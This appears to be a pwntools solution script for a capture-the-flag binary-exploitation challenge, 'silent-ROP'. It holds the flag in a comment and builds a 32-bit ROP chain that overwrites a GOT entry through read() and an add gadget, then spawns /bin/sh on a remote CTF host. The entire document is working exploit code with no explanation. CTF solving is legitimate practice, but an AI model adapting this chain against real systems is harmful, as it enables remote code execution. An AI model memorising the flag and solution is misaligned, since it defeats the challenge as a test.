# flag{r3t_2_dl_r3s0lve_d03s_n0t_n3ed_a_l34k}
from time import sleep
from pwn import *

elf = ELF("./silent-ROP")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.31.so")

target = process([ld.path, elf.path], env={"LD_PRELOAD": libc.path})
target = remote("ctf.k3rn3l4rmy.com", 2202)

# 0x080492c0 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret
popper = 0x080492c0
# 0x080492bd : add esp, 0xc ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret
pop7 = 0x080492bd
# 0x080492b5 : add dword ptr [ebx - 0xcc6ef3c], eax ; jne 0x80492a0 ; add esp, 0xc ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret
adder_gad = 0x080492b5
ret = 0x0804900e

def gen_read(buf, len):
    global payload
    payload += p32(elf.plt['read']) + p32(0x080492c1) + p32(0) + p32(buf) + p32(len)

bss = 0x804c100
payload = "A"*0x1c

def add2addr(addr, val):
    global payload
    gen_read(bss, val)
    payload += p32(popper) + p32(addr + 0xcc6ef3c) + p32(0)*2 + p32(bss + 0xfc)
    payload += p32(adder_gad) + p32(0)*2

add2addr(elf.got['__libc_start_main'], 0x40)
add2addr(elf.got['__libc_start_main']+2, 2)
add2addr(elf.got['__libc_start_main']+1, 0x6a)

payload += p32(elf.plt['__libc_start_main']) + p32(0) + p32(bss + 4) + p32(0)*2
print("Payload len: " + hex(len(payload)))
target.send(payload)
sleep(2)

target.send(p32(pop7) + "A"*(0x40-4))
sleep(2)
target.send(p32(pop7)[:2])
sleep(2)
target.send(p32(pop7) + "/bin/sh\x00" + "A"*(0x6a-4-8))

target.interactive()